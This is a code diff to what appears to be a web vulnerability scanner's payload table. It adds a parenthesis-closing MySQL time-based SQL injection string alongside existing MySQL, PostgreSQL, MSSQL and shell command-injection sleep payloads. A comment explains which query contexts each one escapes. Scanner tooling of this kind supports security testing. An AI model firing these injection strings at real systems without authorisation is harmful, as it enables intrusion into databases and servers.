@@ -66,13 +66,16 @@ REDIRECT_PARAMS = {
 }
 
 # --------------------------------------------------------------- payloads
-# Time-based. {s} = seconds to sleep; the leading 1'/1 closes a likely string
-# or numeric context before the injected delay.
+# Time-based. {s} = seconds to sleep; the leading 1'/1/1') closes a likely string,
+# numeric or parenthesised-string context (a value inside func('…') / IN ('…'))
+# before the injected delay — a plain 1' leaves that paren unclosed (syntax error,
+# no delay), so the paren variant is what catches The-Watchman-style sinks.
 _SQLI_TIME = [
-    ("sqli/MySQL",      "1' AND SLEEP({s})-- -"),
-    ("sqli/MySQL-num",  "1 AND SLEEP({s})-- -"),
-    ("sqli/PostgreSQL", "1';SELECT pg_sleep({s})-- -"),
-    ("sqli/MSSQL",      "1';WAITFOR DELAY '0:0:{s}'-- -"),
+    ("sqli/MySQL",       "1' AND SLEEP({s})-- -"),
+    ("sqli/MySQL-num",   "1 AND SLEEP({s})-- -"),
+    ("sqli/MySQL-paren", "1') AND SLEEP({s})-- -"),
+    ("sqli/PostgreSQL",  "1';SELECT pg_sleep({s})-- -"),
+    ("sqli/MSSQL",       "1';WAITFOR DELAY '0:0:{s}'-- -"),
 ]
 _CMDI_TIME = [
     ("cmdi/shell-;",   "1; sleep {s} "),
